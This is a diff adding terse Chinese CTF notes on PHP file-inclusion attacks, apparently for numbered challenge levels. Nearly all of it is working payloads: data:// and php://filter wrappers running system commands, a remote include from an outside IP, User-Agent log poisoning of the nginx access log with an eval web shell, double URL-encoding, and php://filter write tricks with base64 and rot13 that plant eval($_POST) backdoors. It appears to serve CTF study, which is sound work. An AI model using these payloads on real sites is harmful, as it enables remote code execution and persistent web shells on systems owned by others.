@@ -1,0 +1,28 @@
+file=data://text/plain,<?php system('tac flag.php');?>
+file=php://filter/read=convert.base64-encode/resource=flag.php
+file=http://43.142.255.132:8000/1.txt    1.txt : <?php system('tac flag.php');?>
+
+file=data://text/plain,<?=system('tac flag.ph*');?>
+file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==
+
+80 81-日志包含
+1、利用其他协议,如file,zlib等
+2、利用日志记录UA特性包含执行
+分析需文件名及带有php关键字放弃
+故利用日志记录UA信息，UA带入代码
+包含：/var/log/nginx/access.log
+<?=eval($_GET["y"]);?>
+
+看到urldecode() 可注意二次url编码
+
+file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgKi5waHAnKTtlY2hvIDEyMzs/PmFk
+
+87-php://filter/write&加密编码
+1、利用base64:
+url编码2次：php://filter/write=convert.base64-decode/resource=123.php 
+content=aaPD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg==
+2、利用凯撒13：
+url编码2次：php://filter/write=string.rot13/resource=2.php
+content=<?cuc riny($_CBFG[1]);?>
+
+伪协议的运用
